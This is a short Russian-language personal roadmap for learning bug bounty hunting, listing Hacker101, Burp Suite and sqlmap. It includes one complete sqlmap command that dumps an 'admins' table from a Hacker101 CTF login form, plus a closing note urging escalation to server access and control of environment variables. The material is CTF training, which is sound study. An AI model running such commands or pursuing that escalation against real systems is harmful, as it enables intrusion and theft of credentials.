# Roadmap

1. Получение новых знаний и навыков
2. Нахождение багов
3. Составление корректного отчета о найденном баге

## Получение новых знаний и навыков

[hacker101](https://www.hacker101.com/)

* знакомство с burp suite
* [sqlmap](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

sqlmap -u "https://87712c999b75e62ae32cdf2d219d057c.ctf.hacker101.com/login" --method="POST" --data="username=123&password=123" -v 2 --dbms "MySQL" --threads 5 --dump -T admins

* robots.txt?

Недостаточно получить доступ к базе, желатьельно получить доступ к серверу, знать все его переменные окружения и иметь возможность их менять
